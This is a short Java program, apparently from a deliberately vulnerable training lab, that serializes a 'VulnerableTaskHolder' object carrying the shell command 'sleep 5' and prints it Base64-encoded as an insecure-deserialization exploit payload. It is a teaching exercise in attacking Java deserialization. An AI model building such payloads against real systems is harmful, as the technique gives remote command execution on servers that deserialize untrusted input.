package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Attacker {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder task = new VulnerableTaskHolder("sleep", "sleep 5");
            ByteArrayOutputStream byteAutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteAutputStream);
            objectOutputStream.writeObject(task);
            objectOutputStream.flush();
            byte[] exploit = byteAutputStream.toByteArray();
            String exploit64 = Base64.getEncoder().encodeToString(exploit);
            System.out.println(exploit64);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
